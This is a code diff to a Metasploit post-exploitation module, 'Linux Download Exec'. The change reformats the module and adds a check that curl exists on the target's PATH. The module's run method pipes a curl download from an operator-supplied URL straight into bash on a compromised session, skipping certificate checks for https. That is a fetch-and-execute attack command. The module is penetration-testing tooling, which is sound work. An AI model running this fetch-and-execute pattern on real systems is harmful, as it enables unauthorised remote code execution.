@@ -21,26 +21,48 @@ class Metasploit3 < Msf::Post
 
 	def initialize(info={})
 		super( update_info( info,
-				'Name'          => 'Linux Download Exec',
-				'Description'   => %q{
-					This module downloads and runs a file with bash. It uses curl and bash from the PATH.
-				},
-				'License'       => MSF_LICENSE,
-				'Author'        =>
-					[
-						'Joshua D. Abraham <jabra[at]praetorian.com>',
-					],
-				'Platform'      => [ 'linux' ],
-				'SessionTypes'  => [ 'shell' ]
-			))
-			register_options(
-			[
-				OptString.new('URL', [true, 'Full URL of file to download.'])
-			], self.class)
+			'Name'          => 'Linux Download Exec',
+			'Description'   => %q{
+				This module downloads and runs a file with bash. It uses curl and bash from the PATH.
+			},
+			'License'       => MSF_LICENSE,
+			'Author'        =>
+				[
+					'Joshua D. Abraham <jabra[at]praetorian.com>',
+				],
+			'Platform'      => [ 'linux' ],
+			'SessionTypes'  => [ 'shell' ]
+		))
+
+		register_options(
+		[
+			OptString.new('URL', [true, 'Full URL of file to download.'])
+		], self.class)
 
 	end
 
+	def exists_exe?(exe)
+		path = expand_path("$PATH")
+		if path.nil? or path.empty?
+			return false
+		end
+
+		path.split(":").each{ |p|
+			return true if file_exist?(p + "/" + exe)
+		}
+
+		return false
+	end
+
 	def run
+		print_status("Checking if curl exists in the path...")
+		if exists_exe?("curl")
+			print_good("curl available, going ahead...")
+		else
+			print_warning("curl not available on the $PATH, aborting...")
+			return
+		end
+
 		if datastore['URL'].match(/https/)
 			cmd_exec_vprint("`which curl` -k #{datastore['URL']} 2>/dev/null | `which bash` ")
 		else
